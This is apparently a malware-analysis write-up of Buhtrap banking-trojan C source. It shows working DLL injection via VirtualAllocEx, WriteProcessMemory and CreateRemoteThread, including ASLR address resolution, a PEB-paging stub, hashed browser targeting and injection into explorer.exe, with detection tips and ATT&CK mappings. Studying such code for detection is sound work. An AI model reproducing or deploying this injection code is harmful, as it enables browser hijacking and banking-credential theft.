# Buhtrap - Classic DLL Injection via CreateRemoteThread

**Repository:** MalwareSourceCode-main  
**File Path:** Win32/Win32.Buhtrap/Client/Common/pssup.c  
**Language:** C  
**MITRE ATT&CK:** T1055.001 - Process Injection: Dynamic-link Library Injection

---

## Overview

Buhtrap (a Russian-speaking APT group's banking trojan) implements classic **DLL injection** using the CreateRemoteThread technique. This method allocates memory in a remote process, writes a DLL path string, creates a remote thread executing `LoadLibraryA`, and waits for the thread to complete. It's one of the most well-known process injection techniques, widely used in both malware and legitimate tools (debuggers, game trainers, hooking frameworks).

---

## Code Snippet 1: Kernel Function Address Resolution (ASLR Handling)

```c
#define PEB_FUNC_SIZE  0x100

static WINERROR  ResolveKernelFunctionAddress(
    HANDLE      hProcess,         // Target process handle
    PCHAR       FunctionName,     // Function to resolve (e.g., "LoadLibraryA")
    ULONG       Flags,            // Injection flags (arch, PEB mapping)
    PVOID       pFunction         // Receives function address
)
{
  WINERROR   Status = NO_ERROR;
  HMODULE    hKernel32 = GetModuleHandleW(wczKernel32);
  ULONG_PTR  Function = (ULONG_PTR)GetLoadLibraryPtr();

#ifdef _WIN64
  if (LOBYTE(LOWORD(GetVersion())) >= 6)   // Vista and higher
  {
    // For Vista+: ASLR is enabled by default
    // We must recalculate target function address according to kernel32 base in target process
    // But PEB might be paged out in suspended processes, so we inject a GetPeb() stub first
    
    PVOID ProcessMem;
    
    if (Flags & INJECT_MAP_PEB)
    {
      // Allocate memory in target process for PEB-mapping stub
      if (ProcessMem = VirtualAllocEx(hProcess, NULL, PEB_FUNC_SIZE, 
                                      MEM_COMMIT, PAGE_EXECUTE_READWRITE))
      {
        SIZE_T wBytes = 0;
        PVOID SrcFunc = &GetPeb;  // Our PEB-accessing function
        
        // Write the GetPeb function to remote process
        if (WriteProcessMemory(hProcess, ProcessMem, SrcFunc, 
                               PEB_FUNC_SIZE, &wBytes))
        {
          ULONG ThreadId;
          // Create a remote thread to execute GetPeb, forcing PEB to page in
          HANDLE RemoteThread = CreateRemoteThread(hProcess, NULL, 0x1000, 
                                  (LPTHREAD_START_ROUTINE) ProcessMem, 
                                  0, 0, &ThreadId);
          if (RemoteThread)
          {
            WaitForSingleObject(RemoteThread, INFINITE);
            CloseHandle(RemoteThread);
          }
          else
          {
            Status = GetLastError();
            DbgPrint("PsSup: Cannot create a PEB mapping thread.\\n");
          }
        }
        else
        {
          Status = GetLastError();
          DbgPrint("PsSup: Cannot write a target process memory.\\n");
        }
      }
      else
      {
        Status = GetLastError();
        DbgPrint("PsSup: Cannot allocate a memory within target process.\\n");
      }
    }  // if (Flags & INJECT_MAP_PEB)
  }  // if (LOBYTE(LOWORD(GetVersion())) >= 6)
  
  // Continue to resolve function address accounting for ASLR...
}
```

**What it does:**  
Resolves the address of `LoadLibraryA` (or other kernel32 functions) in the **target process's address space**, accounting for ASLR (Address Space Layout Randomization). On Windows Vista+, kernel32.dll loads at different base addresses per process due to ASLR. 

For suspended processes, the PEB (Process Environment Block) might not be paged into memory yet. To force it to page in, Buhtrap:
1. Allocates RWX memory in the target process
2. Writes a small `GetPeb()` stub function
3. Creates a remote thread to execute the stub
4. Waits for completion, ensuring PEB is now accessible

**Why it's T1055 (DLL Injection Setup):**  
This preparatory step is crucial for DLL injection on modern Windows with ASLR. Without resolving the correct `LoadLibraryA` address in the target process, the injection would fail or crash the target. The PEB mapping technique (injecting a temporary thread to page in PEB) shows advanced Windows internals knowledge.

**Technical Context:**  
- **ASLR (Address Space Layout Randomization):** Introduced in Windows Vista, randomizes DLL base addresses for security
- **PEB (Process Environment Block):** Contains process metadata, including loaded module list
- **PEB Paging Issue:** Newly created suspended processes may have PEB paged out, causing access violations
- **GetPeb() Stub:** Forces PEB to page in by accessing it (`__readfsdword(0x30)` on x86, `__readgsqword(0x30)` on x64)

---

## Code Snippet 2: Same-Architecture DLL Injection (Main Function)

```c
static WINERROR PsSupInjectSameArch(
  HANDLE   hProcess,    // Target process handle
  LPTSTR   DllPath,     // Full path to DLL to inject
  ULONG    Flags        // Injection flags
)
{
  WINERROR     Status = ERROR_UNSUCCESSFULL;
  ULONG        ThreadId, NameLenBytes = ((ULONG)lstrlen(DllPath)+1)*sizeof(_TCHAR);
  PVOID        ProcessMem;
  SIZE_T       wBytes = 0;
  ULONG_PTR    pLoadLibrary = 0;
  HANDLE       RemoteThread = 0;

  do  // not a loop (using break for error handling)
  {
#ifdef _UNICODE
    Status = ResolveKernelFunctionAddress(hProcess, "LoadLibraryW", 
                                          Flags, &pLoadLibrary);
#else
    Status = ResolveKernelFunctionAddress(hProcess, szLoadLibraryA, 
                                          Flags, &pLoadLibrary);
#endif
    if (Status != NO_ERROR)
      break;

    Status = ERROR_UNSUCCESSFULL;

    // Verify LoadLibraryA address is valid in target process
    if (!ReadProcessMemory(hProcess, (PVOID)pLoadLibrary, &wBytes, 
                           sizeof(ULONG), &wBytes))
      // LoadLibraryA in current process may be hooked (SHIM, etc.)
      // Check if the address exists in target process
      break;

    // Allocate memory in target process for DLL path string
    if (!(ProcessMem = VirtualAllocEx(hProcess, NULL, NameLenBytes, 
                                      MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
      break;

    // Write DLL path to allocated memory
    if (!(WriteProcessMemory(hProcess, ProcessMem, DllPath, 
                             NameLenBytes, &wBytes)))
      break;

    // Create remote thread executing LoadLibraryA with DLL path as parameter
    RemoteThread = CreateRemoteThread(hProcess, NULL, 0x1000, 
                                      (LPTHREAD_START_ROUTINE) pLoadLibrary, 
                                      ProcessMem, 0, &ThreadId);
    if (!RemoteThread)
      break;

    // Wait for LoadLibraryA to complete (DLL fully loaded)
    WaitForSingleObject(RemoteThread, INFINITE);

    CloseHandle(RemoteThread);
    Status = NO_ERROR;
  } while(FALSE);

  if (Status == ERROR_UNSUCCESSFULL)
    Status = GetLastError();

  return(Status);
}
```

**What it does:**  
Implements the classic **CreateRemoteThread DLL injection** technique:

1. **Resolve LoadLibraryA:** Gets the address of `LoadLibraryA` (or `LoadLibraryW` for Unicode) in the target process, accounting for ASLR

2. **Allocate Remote Memory:** Uses `VirtualAllocEx` to allocate memory in the target process for the DLL path string (with read-write permissions only)

3. **Write DLL Path:** Uses `WriteProcessMemory` to write the full path of the DLL to inject (e.g., `"C:\\Windows\\malware.dll"`) into the allocated memory

4. **Create Remote Thread:** Uses **CreateRemoteThread** to create a new thread in the target process:
   - **Thread Start Address:** Points to `LoadLibraryA` in kernel32.dll
   - **Thread Parameter:** Points to the DLL path string in remote memory
   - **Effect:** The remote thread executes `LoadLibraryA("C:\\Windows\\malware.dll")`, loading the malicious DLL

5. **Wait for Completion:** Waits for the remote thread to finish, ensuring the DLL is fully loaded before continuing

**Why it's T1055 (DLL Injection):**  
This is the **textbook implementation of T1055.001 - DLL Injection** using CreateRemoteThread. It's one of the most common process injection techniques because:

- **Simple and Reliable:** Only requires 3 Windows APIs (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
- **Leverages Windows Loader:** Uses legitimate `LoadLibraryA` to load the DLL, so imports/exports/TLS are handled automatically
- **Widely Compatible:** Works on all Windows versions (XP through 11)
- **Well-Documented:** Extensively documented in malware research and legitimate programming resources

**API Call Flow:**
```
1. VirtualAllocEx()        → Allocate buffer for DLL path
2. WriteProcessMemory()    → Write "C:\\Windows\\malware.dll"
3. CreateRemoteThread()    → Start thread at LoadLibraryA with path as parameter
4. WaitForSingleObject()   → Wait for LoadLibraryA to finish
5. [DLL is now loaded and its DllMain has executed]
```

---

## Code Snippet 3: High-Level Injection Wrapper

```c
WINERROR PsSupInjectDll(
  ULONG    ProcessId,   // Process ID of target process
  LPTSTR   DllPath,     // Full path to DLL to inject
  ULONG    Flags        // Injection flags
)
{
  HANDLE hProcess;
  WINERROR Status = NO_ERROR;

  // Open target process with required permissions
  hProcess = OpenProcess(
      PROCESS_CREATE_THREAD |      // Permission to create threads
      PROCESS_QUERY_INFORMATION |  // Permission to query process info
      PROCESS_VM_OPERATION |       // Permission to allocate/free memory
      PROCESS_VM_WRITE |           // Permission to write memory
      PROCESS_VM_READ,             // Permission to read memory
      FALSE,                       // Don't inherit handle
      ProcessId                    // Target process ID
  );

  if (hProcess)
  {
    // Inject DLL (from 32-bit to 32-bit or from 64-bit to 64-bit)
    Status = PsSupInjectSameArch(hProcess, DllPath, Flags);
    CloseHandle(hProcess);
  }
  else
  {
    Status = GetLastError();
    DbgPrint("PsSup: Unable to open target process, error: %u.\\n", Status);
  }
  
  return(Status);
}
```

**What it does:**  
Provides a high-level wrapper for DLL injection:

1. **Opens Target Process:** Uses **OpenProcess** with specific access rights required for injection:
   - `PROCESS_CREATE_THREAD` - Allows CreateRemoteThread
   - `PROCESS_VM_OPERATION` - Allows VirtualAllocEx
   - `PROCESS_VM_WRITE` - Allows WriteProcessMemory
   - `PROCESS_VM_READ` - Allows ReadProcessMemory (for validation)
   - `PROCESS_QUERY_INFORMATION` - Allows querying process details

2. **Calls Injection Function:** Invokes `PsSupInjectSameArch` to perform the actual injection

3. **Handles Errors:** Logs errors if process opening fails (e.g., insufficient privileges, process doesn't exist)

**Why it's T1055 (DLL Injection):**  
The required access rights are a strong indicator of process injection intent:

- **PROCESS_CREATE_THREAD + PROCESS_VM_OPERATION + PROCESS_VM_WRITE** = Classic injection permissions
- Security monitoring tools flag `OpenProcess` calls with this permission combination
- Legitimate applications rarely need this specific set of permissions

**Detection Note:**  
Many EDR/AV products monitor for `OpenProcess` calls with this exact permission mask, as it's a strong indicator of CreateRemoteThread injection.

---

## Code Snippet 4: Process Enumeration for Browser Injection (Gozi-ISFB Context)

```c
static VOID EnumProcessAndInjectDll(
  LPTSTR  DllPath,
  ULONG   Flags
)
{
  PROCESSENTRY32  Process = {0};
  HANDLE  hSnapshot;
  
  Process.dwSize = sizeof(PROCESSENTRY32);
  
  // Create snapshot of all running processes
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  
  if (hSnapshot != INVALID_HANDLE_VALUE)
  {
    if (Process32First(hSnapshot, &Process))
    {
      do 
      {
        if (Process.th32ProcessID != g_CurrentProcessId)
        {
          ULONG NameHash;
          strupr((LPTSTR)&Process.szExeFile);

          // Hash the process name and check against predefined targets
          NameHash = (Crc32((LPTSTR)&Process.szExeFile, 
                           lstrlen((LPTSTR)&Process.szExeFile)) ^ g_CsCookie);

          // Check if process is a target browser (IE, Firefox, Chrome, Opera)
          if (NameHash == HOST_IE || NameHash == HOST_FF || 
              NameHash == HOST_CR || NameHash == HOST_OP)
          {
            DbgPrint("ISFB: Injecting Client DLL to a predefined host process %s\\n", 
                     (LPTSTR)&Process.szExeFile);
            
            // Inject the malicious DLL into the browser process
            PsSupInjectDll(Process.th32ProcessID, DllPath, Flags);
          }
        }  // if (Process.th32ProcessID != g_CurrentProcessId)
      } while (Process32Next(hSnapshot, &Process));
    }  // if (Process32First(hSnapshot, &Process))
    
    CloseHandle(hSnapshot);
  }  // if (hSnapshot != INVALID_HANDLE_VALUE)
}
```

**What it does:**  
Enumerates all running processes using **CreateToolhelp32Snapshot** and **Process32First/Next**, searching for browser processes to inject. The code:

1. **Creates Process Snapshot:** Uses `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)` to get a list of all running processes

2. **Iterates Through Processes:** Walks through each process using `Process32First` and `Process32Next`

3. **Hashes Process Names:** Calculates CRC32 hash of process name (uppercased) XORed with a cookie value

4. **Checks Against Targets:** Compares hash against predefined browser hashes:
   - `HOST_IE` - Internet Explorer (iexplore.exe)
   - `HOST_FF` - Firefox (firefox.exe)
   - `HOST_CR` - Chrome (chrome.exe)
   - `HOST_OP` - Opera (opera.exe)

5. **Injects into Matches:** Calls `PsSupInjectDll` to inject the malicious DLL into each matching browser process

**Why it's T1055 (Targeted Injection):**  
This demonstrates **targeted process injection** characteristic of banking trojans:

- **Browser-Specific:** Only injects into browsers (for intercepting banking traffic)
- **Automated:** Automatically finds and infects all running browser instances
- **Stealthy:** Uses hashing instead of plaintext strings to avoid signature detection
- **Persistence:** Re-injection loop ensures malware persists across browser restarts

**Hash-Based Process Targeting:**  
Using CRC32 hashes instead of plaintext process names is a common obfuscation technique:
```c
// Instead of:
if (strcmp(ProcessName, "iexplore.exe") == 0) { inject(); }

// Buhtrap uses:
if (hash(ProcessName) == 0x12345678) { inject(); }
```

This makes static analysis harder—analysts must reverse-engineer the hash algorithm and cookie value to determine targeted processes.

---

## Code Snippet 5: Windows Shell Process Injection

```c
// Inject into the Windows shell process first
GetWindowThreadProcessId(GetShellWindow(), &ShellPid);
PsSupInjectDll(ShellPid, DllPath, Flags);

// Then inject into every browser process running
EnumProcessAndInjectDll(DllPath, Flags);
```

**What it does:**  
Prioritizes injecting into the **Windows shell process** (explorer.exe) before injecting into browsers. `GetShellWindow()` returns the handle to the desktop window, and `GetWindowThreadProcessId` extracts the process ID of the process that created it (always explorer.exe).

**Why it's T1055 (Strategic Injection):**  
Injecting into explorer.exe provides strategic advantages:

- **Persistence:** Explorer.exe runs for the entire user session (from login to logout)
- **System-Level Access:** Explorer.exe has broad access to user files and registry
- **Network Connectivity:** Trusted by firewalls for outbound connections
- **Parent Process Spoofing:** Child processes inherit explorer.exe as parent, appearing legitimate
- **Watchdog:** If browsers close, malware in explorer.exe can re-inject when they restart

Many banking trojans (Zeus, Gozi, Dridex, TrickBot) inject into explorer.exe as a staging point before targeting specific applications.

---

## Code Snippet 6: Error Handling and Validation

```c
// Verify LoadLibraryA address is valid in target process
if (!ReadProcessMemory(hProcess, (PVOID)pLoadLibrary, &wBytes, 
                       sizeof(ULONG), &wBytes))
{
  // This may rarely happen that LoadLibraryA within current process was hooked
  // either by SHIM or any other way. That's why we have to check if the 
  // specified address present within the target process.
  break;
}
```

**What it does:**  
Validates that the resolved `LoadLibraryA` address is readable in the target process using **ReadProcessMemory**. This catches cases where:

- **API Hooking:** Security products or application compatibility shims have hooked `LoadLibraryA` in the current process
- **Different Kernel32 Versions:** Target process uses a different kernel32.dll version
- **ASLR Miscalculation:** The ASLR recalculation failed

**Why it's T1055 (Robustness):**  
This validation shows professional malware development practices:

- **Anti-Hooking:** Detects when security products have hooked APIs
- **Reliability:** Prevents crashes from using incorrect function addresses
- **Fallback Handling:** Allows the code to try alternative injection methods

The comment about "SHIM" refers to Windows Application Compatibility Shims—a legitimate Windows feature that can hook APIs to fix compatibility issues. Security products sometimes abuse this mechanism to hook malicious API calls, and Buhtrap is aware of this.

---

## Explanation

**What this code does:**  
Buhtrap implements **classic DLL injection via CreateRemoteThread**, one of the most fundamental process injection techniques. The implementation includes:

1. **ASLR Handling:** Resolves `LoadLibraryA` address in target process, accounting for Address Space Layout Randomization on modern Windows

2. **PEB Mapping:** Injects a temporary thread to force PEB paging in suspended processes (sophisticated technique rarely seen in basic injectors)

3. **DLL Path Injection:** Allocates memory in target, writes DLL path, creates remote thread at `LoadLibraryA`

4. **Targeted Injection:** Enumerates processes, targets browsers using hashed process names

5. **Strategic Prioritization:** Injects explorer.exe first for persistence, then browsers for traffic interception

**How it implements T1055 (DLL Injection):**  
This is a **textbook T1055.001 - Dynamic-link Library Injection** implementation with advanced features:

**Standard DLL Injection Flow:**
1. `OpenProcess()` - Get handle with injection permissions
2. `VirtualAllocEx()` - Allocate memory for DLL path
3. `WriteProcessMemory()` - Write DLL path string
4. `CreateRemoteThread()` - Start thread at LoadLibraryA with path parameter
5. `WaitForSingleObject()` - Wait for DLL to load
6. [DLL's DllMain executes, malicious code runs]

**Advanced Features:**
- **ASLR Resolution:** Recalculates function addresses per target process
- **PEB Force-Paging:** Injects temporary thread to page in PEB (for suspended process support)
- **Anti-Hooking:** Validates LoadLibraryA address to detect hooks
- **Hash-Based Targeting:** Uses CRC32 hashes to obfuscate targeted process names
- **Multi-Process Infection:** Automatically injects into all browser instances

**Buhtrap Banking Trojan Context:**  
Buhtrap is a Russian-speaking APT group active since 2014, targeting banks and financial institutions primarily in Russia and Eastern Europe. Their namesake trojan uses this injection technique to:

- **Intercept Banking Transactions:** Inject into browser processes to manipulate transactions
- **Steal Credentials:** Hook browser crypto APIs to capture plaintext credentials
- **Web Injects:** Modify bank websites to add fake fields for 2FA/OTP capture
- **Persistence:** Maintain presence in explorer.exe and browsers across system reboots

Buhtrap's sophistication (ASLR handling, PEB mapping, hash-based targeting) indicates APT-level development resources, distinguishing it from commodity malware.

**APIs that make it a strong T1055 match:**  
- **OpenProcess** with `PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE` - Classic injection permissions
- **VirtualAllocEx** - Remote memory allocation
- **WriteProcessMemory** - Writing DLL path to remote process
- **CreateRemoteThread** - Remote thread creation at LoadLibraryA
- **CreateToolhelp32Snapshot + Process32First/Next** - Process enumeration for targeting
- **GetWindowThreadProcessId(GetShellWindow(), ...)** - Explorer.exe targeting

**Comparison to Other Injection Techniques:**

| Technique | Buhtrap DLL Injection | RedLine Process Hollowing | Zeus PE Injection |
|-----------|----------------------|---------------------------|-------------------|
| **Method** | CreateRemoteThread + LoadLibraryA | NtUnmapViewOfSection + Manual Map | VirtualAllocEx + Relocations |
| **Complexity** | Low | High | Medium-High |
| **Process State** | Running | Suspended (newly created) | Running |
| **Loader Used** | Yes (LoadLibraryA) | No (manual) | No (manual) |
| **Original Code** | Remains (unused) | Removed (unmapped) | Remains (unused) |
| **Import Resolution** | Automatic (Windows) | Manual (attacker) | Manual (attacker) |

**Malware Family Resemblance:**  
- **Gozi-ISFB** - Uses identical CreateRemoteThread + process enumeration approach
- **Dridex** - Similar browser targeting via CreateRemoteThread injection
- **Zeus** - Also uses CreateRemoteThread (in addition to PE injection)
- **Emotet** - CreateRemoteThread for lateral movement and browser injection
- **TrickBot** - Multi-technique injector including CreateRemoteThread

The code comment mentioning "SHIM" detection and the PEB force-paging technique are particularly sophisticated touches rarely seen in commodity malware.

**Detection Opportunities:**  
- `OpenProcess` calls with `PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE` permission mask
- `CreateRemoteThread` API calls from non-debugger processes
- `VirtualAllocEx` followed by `WriteProcessMemory` writing strings ending in `.dll`
- Remote threads starting at kernel32!LoadLibraryA or kernel32!LoadLibraryW
- Process enumeration (`CreateToolhelp32Snapshot`) followed by multiple OpenProcess calls
- Unexpected DLLs loaded in browser processes or explorer.exe
- Unbacked memory regions in trusted processes (though LoadLibraryA-based injection does have backing files)

**MITRE ATT&CK Mapping:**  
- **T1055** - Process Injection (Primary)
- **T1055.001** - Process Injection: Dynamic-link Library Injection (Specific Sub-technique)
- **T1057** - Process Discovery (CreateToolhelp32Snapshot enumeration)
- **T1082** - System Information Discovery (OS version check for ASLR handling)
- **T1185** - Browser Session Hijacking (Goal after browser injection)
- **T1056.002** - Input Capture: GUI Input Capture (Keylogging post-injection)
- **T1539** - Steal Web Session Cookie (Banking credential theft)
- **T1027.002** - Obfuscated Files or Information: Software Packing (Hash-based process name obfuscation)
